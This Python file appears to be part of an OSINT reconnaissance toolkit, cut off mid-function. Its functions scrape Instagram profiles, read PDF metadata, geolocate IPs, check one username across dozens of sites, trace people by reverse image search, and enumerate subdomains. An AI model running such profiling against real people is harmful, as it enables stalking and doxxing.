from instagramy import InstagramUser
from urllib.request import urlopen
from termcolor import colored
from bs4 import BeautifulSoup
from datetime import datetime
import scapy.all as scapy
from requests import get
from halo import Halo
import pyshorteners
import subprocess
import pyfiglet
import requests
import PyPDF2
import codecs
import socket
import urllib
import json
import time
import sys
import os
import re

cyan = "\033[1;36;40m"
green = "\033[1;32;40m"
red = "\033[1;31;40m"
Y = '\033[1;33;40m'
W = "\033[1;37;40m"
Blue = '\033[94m'


def instarecon():
    try:
        print("\t\t!!!!............ INSTAGRAM INFORMATION GATHERING ............!!!!\n\n")
        print(cyan + """ ──▄█████████████████████████▄──
    ▄█▀░█░█░█░░░░░░░░░░░░░░░░░░░▀█▄
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░░░░░░░▄▄▄█████▄▄▄░░░░░░░░░█
    ███████████▀▀░░░░░▀▀███████████
    █░░░░░░░██░░▄█████▄░░██░░░░░░░█
    █░░░░░░░██░██▀░░░▀██░██░░░░░░░█
    █░░░░░░░██░██░░░░░██░██░░░░░░░█
    █░░░░░░░██░██▄░░░▄██░██░░░░░░░█
    █░░░░░░░██▄░▀█████▀░▄██░░░░░░░█
    █░░░░░░░░▀██▄▄░░░▄▄██▀░░░░░░░░█
    █░░░░░░░░░░▀▀█████▀▀░░░░░░░░░░█
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    ▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄█▀
    ──▀█████████████████████████▀──
    """)
        username = input(W + "Enter the Username  >>")
        user = InstagramUser(username)
        print("-" * 50)
        print(" " * 15, "User name : " + username)
        print("-" * 50)
        print("Full name >> ", user.fullname)
        print(' ')
        print("Biography >> ", user.biography)
        print(' ')
        verify = user.is_verified
        if verify == False:
            print("Verified status >> Not Verified")
            print(' ')
        else:
            print("Verified status >> Verified")
            print(' ')
        account = user.is_private
        if account == False:
            print("Account status >> Public account")
            print(' ')
        else:
            print("Account status >> Private account")
            print(' ')
        print("URL >> ", user.website)
        print(' ')
        userphoto = user.profile_picture_url
        print("Profile Picture url >> ", userphoto)
        print('')
        print("Followers >> ", user.number_of_followers)
        print('')
        print('Following >> ', user.number_of_followings)
        print('')
        print('Posts posted >> ', user.number_of_posts)
        print('')

        print(green + 'Completed....')
        print('')
    except KeyboardInterrupt:
        os.system("clear")
        reconinput()


def pdfinfo():
    try:
        print(red + "\t\t!!!!................PDF meta data analysis................!!!!\n\n")
        print(cyan + """▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░▒▒▒▒░░░▒▒▒▒░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒░▒▒▒▒▒▒░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░▒▒▒░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    _______▒__________▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ______▒_______________▒▒▒▒▒▒▒▒
    _____▒________________▒▒▒▒▒▒▒▒
    ____▒___________▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ___▒
    __▒______▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    _▒______▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒▒___▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒▒__▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒__▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▒▒
    """)
        filep = input(Y + "Enter The File path >>")
        with open(filep, 'rb') as f:
            pdf = PyPDF2.PdfFileReader(f)
            info = pdf.getDocumentInfo()
            number_of_pages = pdf.getNumPages()
        try:
            author = info.author
            creator = info.creator
            producer = info.producer
            print("\n")
            print(cyan + "[+] Author        : ", author)
            print(cyan + "[+] Creator       : ", creator)
            print(cyan + "[+] Producer      : ", producer)
            cdate = info['/CreationDate']
            cyear = cdate[2:6]
            cmonth = cdate[6:8]
            cd = cdate[8:10]
            print(cyan + "[+] Creation Date : ", cd, ":", cmonth, ":", cyear)
            mdate = info['/ModDate']
            myear = cdate[2:6]
            mmonth = cdate[6:8]
            md = cdate[8:10]
            print(cyan + "[+] Modified Date : ", md, ":", mmonth, ":", myear, "\n\n\n")
        except:
            print(red + "[-] Meta data not available\n\n\n")
    except KeyboardInterrupt:
        os.system("clear")
        reconinput()


def iplocate():
    try:
        print("\t\t\b!!!!............Trace Single IP............!!!!\n\n")
        print(red + """              ¶¶¶
                ¶¶_¶¶¶¶
                ¶¶____¶¶¶
               ¶¶¶______¶¶
              ¶¶¶_______¶¶
              ¶¶¶¶________¶¶
              ¶_¶¶_________¶¶
              ¶__¶¶_________¶¶____¶¶
              ¶__¶¶__________¶¶¶¶¶¶¶
             ¶¶__¶¶¶______¶¶¶¶¶¶___¶
             ¶¶___¶¶__¶¶¶¶¶¶__¶¶
           ¶¶_¶____¶¶¶¶________¶¶
          ¶¶__¶¶___¶¶__________¶¶
         ¶____¶¶___¶¶__________¶¶
       ¶¶_______¶¶___¶¶_________¶¶
       ¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶_________¶
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶________¶¶
    ¶¶__¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶______¶¶
    ¶¶¶¶¶___¶______¶___¶¶¶¶¶_____¶¶
            ¶¶¶¶¶¶¶¶______¶¶¶¶¶_¶¶
          ¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶
          ¶¶¶¶¶¶¶¶¶¶¶¶
          ¶__¶¶_¶¶¶¶¶¶
         ¶¶______¶___¶
         ¶¶_____¶¶___¶
         ¶______¶¶___¶
        ¶¶______¶¶___¶¶
        ¶¶______¶¶___¶¶
       ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
      ¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶
      ¶¶________¶¶¶____¶¶
       ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    """)
        ip = input(W + "Enter The Ip address >> ")
        url = "http://ip-api.com/json/" + ip
        r = requests.get(url)
        ipinfo = r.json()
        if ipinfo['status'] == 'success':
            lat = ipinfo['lat']
            lon = ipinfo['lon']
            print("\n\n\t\t" + green + ".......Ip location Found !!.......\n\n")
            print('\n\tCountry     : ', ipinfo['country'])
            print('\n\tRegion Name : ', ipinfo['regionName'])
            print('\n\tCity        : ', ipinfo['city'])
            print('\n\tTime zone   : ', ipinfo['timezone'])
            print('\n\tISP         : ', ipinfo['isp'])
            print(green + "\n\n\t\t.........Complete !!.........\n\n")
        else:
            print("\n\n\t\t" + red + ".........Ip location Not Found......... !!")
    except KeyboardInterrupt:
        os.system("clear")
        reconinput()


def social_hunt():
    C = "\033[1;36;40m"
    G = "\033[1;32;40m"
    W = "\033[1;37;40m"
    R = "\033[1;31;40m"
    try:
        os.system("clear")
        print("\t\t\b" + C + "!!!!..........USERNAME ENUMERATION..........!!!!\n\n")
        print(C + """▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░▒▒▒▒░░░▒▒▒▒░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒░▒▒▒▒▒▒░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░▒▒▒░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    _______▒__________▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ______▒_______________▒▒▒▒▒▒▒▒
    _____▒________________▒▒▒▒▒▒▒▒
    ____▒___________▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ___▒
    __▒______▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    _▒______▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒▒___▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒▒__▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒__▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▒▒

    """)
        username = input(G + "\tInput Username:" + W)
        print(G + "\n\tChecking Username " + W + username + G + " on : \n\n\n")

        # instagram
        response = requests.get('https://www.instagram.com/' + username)
        code = response.status_code
        if code == 200:
            print(W + "[+] INSTAGRAM  :" + G + " FOUND!! " + Y + " https://www.instagram.com/" + username)
        else:
            print(W + "[+] INSTAGRAM  :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # # facebook
        response = requests.get('https://www.facebook.com/' + username)
        code1 = response.status_code

        if code1 == 200:
            print(W + "[+] FACEBOOK  :" + G + " FOUND!! " + Y + " https://www.facebook.com/" + username)
        else:
            print(W + "[+] FACEBOOK  :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # twitter
        response = requests.get('https://www.twitter.com/' + username)
        code2 = response.status_code
        if code2 == 200:
            print(W + "[+] TWITTER  :" + G + " FOUND!! " + Y + " https://www.twitter.com/" + username)
        else:
            print(W + "[+] TWITTER :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # YOUTUBE
        response = requests.get('https://www.youtube.com/' + username)
        code3 = response.status_code
        if code3 == 200:
            print(W + "[+] YOUTUBE  :" + G + " FOUND!! " + Y + " https://www.youtube.com/" + username)
        else:
            print(W + "[+] YOUTUBE  :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # BLOGGER
        response = requests.get('https://' + username + '.blogspot.com')
        code4 = response.status_code
        if code4 == 200:
            print(W + "[+] BLOGGER  :" + G + " FOUND!! " + Y + ' https://blogspot.com/' + username)
        else:
            print(W + "[+] BLOGGER  :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # GOOGLE PLUS

        response = requests.get('https://plus.google.com/' + username + '/posts')
        code5 = response.status_code
        if code5 == 200:
            print(W + "[+] GOOGLE PLUS  :" + G + " FOUND!! " + Y + 'https://plus.google.com/posts' + username)
        else:
            print(W + "[+] GOOGLE PLUS :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # REDDIT

        response = requests.get('https://www.reddit.com/user/' + username)
        code6 = response.status_code
        if code6 == 200:
            print(W + "[+] REDDIT  :" + G + " FOUND!! " + Y + " https://www.reddit.com/user/" + username)
        else:
            print(W + "[+] REDDIT :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # WORDPRESS

        response = requests.get('https://' + username + '.wordpress.com')
        code7 = response.status_code
        if code7 == 200:
            print(W + "[+] WORDPRESS  :" + G + " FOUND!! " + Y + ' https://wordpress.com' + username)
        else:
            print(W + "[+] WORDPRESS :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # PINTEREST

        response = requests.get('https://www.pinterest.com/' + username)
        code8 = response.status_code
        if code8 == 200:
            print(W + "[+] PINTEREST  :" + G + " FOUND!! " + Y + ' https://www.pinterest.com/' + username)
        else:
            print(W + "[+] PINTEREST :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # GITHUB

        response = requests.get('https://www.github.com/' + username)
        code9 = response.status_code
        if code9 == 200:
            print(W + "[+] GITHUB  :" + G + " FOUND!! " + Y + ' https://www.github.com/' + username)
        else:
            print(W + "[+] GITHUB :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # TUMBLR

        response = requests.get('https://' + username + '.tumblr.com')
        code10 = response.status_code
        if code10 == 200:
            print(W + "[+] TUMBLR  :" + G + " FOUND!! " + Y + ' https://tumblr.com/' + username)
        else:
            print(W + "[+] TUMBLR :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # FLICKR

        response = requests.get('https://www.flickr.com/people/' + username)
        code11 = response.status_code
        if code11 == 200:
            print(W + "[+] FLICKR  :" + G + " FOUND!! " + Y + ' https://www.flickr.com/people/' + username)
        else:
            print(W + "[+] FLICKR :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # STEAM

        response = requests.get('https://steamcommunity.com/id/' + username)
        code12 = response.status_code
        if code12 == 200:
            print(W + "[+] STEAM  :" + G + " FOUND!! " + Y + ' https://steamcommunity.com/id/' + username)
        else:
            print(W + "[+] STEAM :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # VIMEO

        response = requests.get('https://vimeo.com/' + username)
        code13 = response.status_code
        if code13 == 200:
            print(W + "[+] VIMEO :" + G + " FOUND!! " + Y + ' https://vimeo.com/' + username)
        else:
            print(W + "[+] VIMEO :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # SoundCloud

        response = requests.get('https://soundcloud.com/' + username)
        code14 = response.status_code
        if code14 == 200:
            print(W + "[+] SoundCloud :" + G + " FOUND!! " + Y + ' https://soundcloud.com/' + username)
        else:
            print(W + "[+] SoundCloud :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # DISQUS

        response = requests.get('https://disqus.com/' + username)
        code15 = response.status_code
        if code15 == 200:
            print(W + "[+] DISQUS :" + G + " FOUND!! " + Y + ' https://disqus.com/' + username)
        else:
            print(W + "[+] DISQUS :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # MEDIUM

        response = requests.get('https://medium.com/@' + username)
        code16 = response.status_code
        if code16 == 200:
            print(W + "[+] MEDIUM :" + G + " FOUND!! " + Y + ' https://medium.com/@' + username)
        else:
            print(W + "[+] MEDIUM :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # DEVIANTART

        response = requests.get('https://' + username + '.deviantart.com')
        code17 = response.status_code
        if code17 == 200:
            print(W + "[+] DEVIANTART :" + G + " FOUND!! " + Y + ' https://deviantart.com/' + username)
        else:
            print(W + "[+] DEVIANTART :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # About.me

        response = requests.get('https://about.me/' + username)
        code18 = response.status_code
        if code18 == 200:
            print(W + "[+] About.me :" + G + " FOUND!! " + Y + ' https://about.me/' + username)
        else:
            print(W + "[+] About.meT :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # Imgur

        response = requests.get('https://imgur.com/user/' + username)
        code19 = response.status_code
        if code19 == 200:
            print(W + "[+] Imgur :" + G + " FOUND!! " + Y + ' https://imgur.com/user/' + username)
        else:
            print(W + "[+] Imgur :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # FlipBoard

        response = requests.get('https://flipboard.com/@' + username)
        code20 = response.status_code
        if code20 == 200:
            print(W + "[+] FlipBoard :" + G + " FOUND!! " + Y + ' https://flipboard.com/@' + username)
        else:
            print(W + "[+] FlipBoard :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # SlideShare

        response = requests.get('https://slideshare.net/' + username)
        code21 = response.status_code
        if code21 == 200:
            print(W + "[+] SlideShare :" + G + " FOUND!! " + Y + ' https://slideshare.net/' + username)
        else:
            print(W + "[+] SlideShare :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # Fotolog

        response = requests.get('https://fotolog.com/' + username)
        code22 = response.status_code
        if code22 == 200:
            print(W + "[+] Fotolog :" + G + " FOUND!! " + Y + ' https://fotolog.com/' + username)
        else:
            print(W + "[+] Fotolog :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # Spotify

        response = requests.get('https://open.spotify.com/user/' + username)
        code23 = response.status_code
        if code23 == 200:
            print(W + "[+] Spotify :" + G + " FOUND!! " + Y + ' https://open.spotify.com/user/' + username)
        else:
            print(W + "[+] Spotify :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # MixCloud

        response = requests.get('https://www.mixcloud.com/' + username)
        code24 = response.status_code
        if code24 == 200:
            print(W + "[+] MixCloud :" + G + " FOUND!! " + Y + ' https://www.mixcloud.com/' + username)
        else:
            print(W + "[+] MixCloud :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # Scribd

        response = requests.get('https://www.scribd.com/' + username)
        code25 = response.status_code
        if code25 == 200:
            print(W + "[+] Scribd :" + G + " FOUND!! " + Y + ' https://www.scribd.com/' + username)
        else:
            print(W + "[+] Scribd :" + R + " NOT FOUND!!")
        print(C + "...................................................................")

        # Badoo

        response = requests.get('https://www.badoo.com/en/' + username)
        code26 = response.status_code
        if code26 == 200:
            print(W + "[+] Badoo :" + G + " FOUND!! " + Y + ' https://www.badoo.com/en/' + username)
        else:
            print(W + "[+] Badoo :" + R + " NOT FOUND!!")
        print(C + "...................................................................")
    except KeyboardInterrupt:
        os.system("clear")
        reconinput()


def recon():
    try:
        spinner = Halo(text=' Scanning', spinner='dots')
        os.system("clear")
        print(Y + "\n\t\t\b!!!!..........Social media hunting using image.........!!!!!\n\n")
        print(cyan + """        ▄▄▄▄▄▄▄▄▄
            ▌▐░▀░▀░▀▐
            ▌░▌░░░░░▐
            ▌░░░░░░░▐
            ▄▄▄▄▄▄▄▄▄
      ▄▀▀▀▀▀▌▄█▄░▄█▄▐▀▀▀▀▀▄
     █▒▒▒▒▒▐░░░░▄░░░░▌▒▒▒▒▒█
    ▐▒▒▒▒▒▒▒▌░░░░░░░▐▒▒▒▒▒▒▒▌
    ▐▒▒▒▒▒▒▒█░▀▀▀▀▀░█▒▒▒▒▒▒▒▌
    ▐▒▒▒▒▒▒▒▒█▄▄▄▄▄█▒▒▒▒▒▒▒▒▌
    ▐▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▌
    ▐▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▌
    ▐▒▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▌▒▒▒▒▒▌
    ▐▒▒▒▒▒▒▌▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▒▌
    ▐▒▒▒▒▒▒▌▄▄▄▄▄▄▄▄▄▐▒▒▒▒▒▒▌
    ▐▄▄▄▄▄▄▌▌███████▌▐▄▄▄▄▄▄▌
     █▀▀▀▀█ ▌███▌███▌ █▀▀▀▀█
     ▐░░░░▌ ▌███▌███▌ ▐░░░░▌
      ▀▀▀▀  ▌███▌███▌  ▀▀▀▀
            ▌███▌███▌
            ▌███▌███▌
          ▐▀▀▀██▌█▀▀▀▌
    ▒▒▒▒▒▒▐▄▄▄▄▄▄▄▄▄▄▌▒▒▒▒▒▒▒
    """)
        image = input(green + "Enter the image path >> ")
        try:
            spinner.start()
            headers = {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Max-Age': '3600',
                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
            }
            url = 'https://www.google.co.in/searchbyimage/upload'
            secondurl = {'encoded_image': (image, open(image, 'rb')), 'image_content': ''}
            response = requests.post(url, files=secondurl, allow_redirects=False)
            fetch = response.headers['Location']
            # print(fetch)
            req = requests.get(fetch, headers=headers)
            socialmedia = ["instagram", "facebook", "twitter", "linkedin", "github"]
            linklist = []
            print(green + "[+] Scan started......")
            print(green + "Checking whether the image is associated in any social media ")
            print(green + "Scanning started in Instagram")
            print(green + "Scanning started in Github")
            print(green + "Scanning started in Facebook")
            print(green + "Scanning started in Twitter")
            print(green + "Scanning started in Linkedin")
            if (req.status_code == 200):

                soup = BeautifulSoup(req.content, 'html.parser')
                for g in soup.find_all('div', class_='g'):
                    anchors = g.find_all('a')
                    if 'href' in str(anchors[0]):
                        linklist.append(anchors[0]['href'])
                        # print(linklist)
                c = 0
                for i in socialmedia:
                    sm = str(i)
                    # print(sm)
                    for j in linklist:
                        if sm in str(j):
                            c = c + 1
                            print(cyan + "[+]" + j)
                if c == 0:
                    print(red + "No social Media links associated with this image")
            spinner.stop()
        except Exception as e:
            print(e)
    except KeyboardInterrupt:
        os.system("clear")
        reconinput()


def reconinput():
    ascii_banner = pyfiglet.figlet_format("INFORMATION GATHERING")
    print(colored(ascii_banner, 'yellow', attrs=["bold"]))
    print(green + """ 

               1.Instagram Information Gathering
               2.PDF meta data analysis
               3.Trace Single IP
               4.Username Enumeration
               5.Social media Hunt 

               usage : type exit back to menu
               """)
    inp = (input("Info>> "))

    if inp == '1':
        os.system("clear")
        instarecon()
    elif inp == '2':
        os.system("clear")
        pdfinfo()
    elif inp == '3':
        os.system("clear")
        iplocate()
    elif inp == '4':
        os.system("clear")
        social_hunt()
    elif inp == '5':
        os.system("clear")
        recon()
    elif inp == 'exit':
        os.system("clear")
        dexosint()
    else:
        print(red + "Enter an valid option")
    while True:
        reconinput()


def fuzz():
    try:
        print(cyan + "\t\t\t\b!!!.........Subdomain Enumeration..........!!!")
        print(green + """                                                 .------.------.    
      +-------------+                     ___        |      |      |    
      |             |                     \ /]       |      |      |    
      |             |        _           _(_)        |      |      |    
      |             |     ___))         [  | \___    |      |      |    
      |             |     ) //o          | |     \   |      |      |    
      |             |  _ (_    >         | |      ]  |      |      |    
      |          __ | (O)  \__<          | | ____/   '------'------'    
      |         /  o| [/] /   \)        [__|/_                          
      |             | [\]|  ( \         __/___\_____                    
      |             | [/]|   \ \__  ___|            |                   
      |             | [\]|    \___E/%%/|____________|_____              
      |             | [/]|=====__   (_____________________)             
      |             | [\] \_____ \    |                  |              
      |             | [/========\ |   |                  |              
      |             | [\]     []| |   |                  |              
      |             | [/]     []| |_  |                  |              
      |             | [\]     []|___) |                  |              
    ====================================================================""")
        dom = input("\n\nEnter Domain (ex: facebook.com) >> ")
        url = "https://sonar.omnisint.io/subdomains/" + dom
        r = requests.get(url)
        print(Y + "\n\n\t\tEnumerating Subdomains ^-^ .....\n\n")
        for i in r.json():
            print(green + "[+]" + i)
        print(cyan + "\n\n\t\t\t!!!..........Subdomain Enumeration Success..........!!!")
    except KeyboardInterrupt:
        os.system("clear")
        Webvuln()


def ReverseIP():
    try:
        print(red + "\t\t\t\b!!!.........Reverse IP..........!!!")
        print(cyan + """              ¶¶¶
                ¶¶_¶¶¶¶
                ¶¶____¶¶¶
               ¶¶¶______¶¶
              ¶¶¶_______¶¶
              ¶¶¶¶________¶¶
              ¶_¶¶_________¶¶
              ¶__¶¶_________¶¶____¶¶
              ¶__¶¶__________¶¶¶¶¶¶¶
             ¶¶__¶¶¶______¶¶¶¶¶¶___¶
             ¶¶___¶¶__¶¶¶¶¶¶__¶¶
           ¶¶_¶____¶¶¶¶________¶¶
          ¶¶__¶¶___¶¶__________¶¶
         ¶____¶¶___¶¶__________¶¶
       ¶¶_______¶¶___¶¶_________¶¶
       ¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶_________¶
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶________¶¶
    ¶¶__¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶______¶¶
    ¶¶¶¶¶___¶______¶___¶¶¶¶¶_____¶¶
            ¶¶¶¶¶¶¶¶______¶¶¶¶¶_¶¶
          ¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶
          ¶¶¶¶¶¶¶¶¶¶¶¶
          ¶__¶¶_¶¶¶¶¶¶
         ¶¶______¶___¶
         ¶¶_____¶¶___¶
         ¶______¶¶___¶
        ¶¶______¶¶___¶¶
        ¶¶______¶¶___¶¶
       ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
      ¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶
      ¶¶________¶¶¶____¶¶
       ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶""")
        host = input(Y + "\n\nEnter host (ex: facebook.com) >> ")
        lookup = 'https://api.hackertarget.com/reverseiplookup/?q=%s' % host
        try:
            result = get(lookup).text
            print(green + "\n\n[+]" + result)
            print(cyan + "\n\n\t\t\t!!!..........Reverse IP Successfully Completed..........!!!")

        except:
            print(red + '!!!..........Invalid IP address.........!!!')
    except KeyboardInterrupt:
        os.system("clear")
        Webvuln()


def websiteinfofather():
    try:
        print(red + "\t\t\t\b!!!.........Website Information Gathering..........!!!")
        print(cyan + """▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░▒▒▒▒░░░▒▒▒▒░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒░▒▒▒▒▒▒░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░▒▒▒░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒░░░░▓▓
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░░░░░▓▓
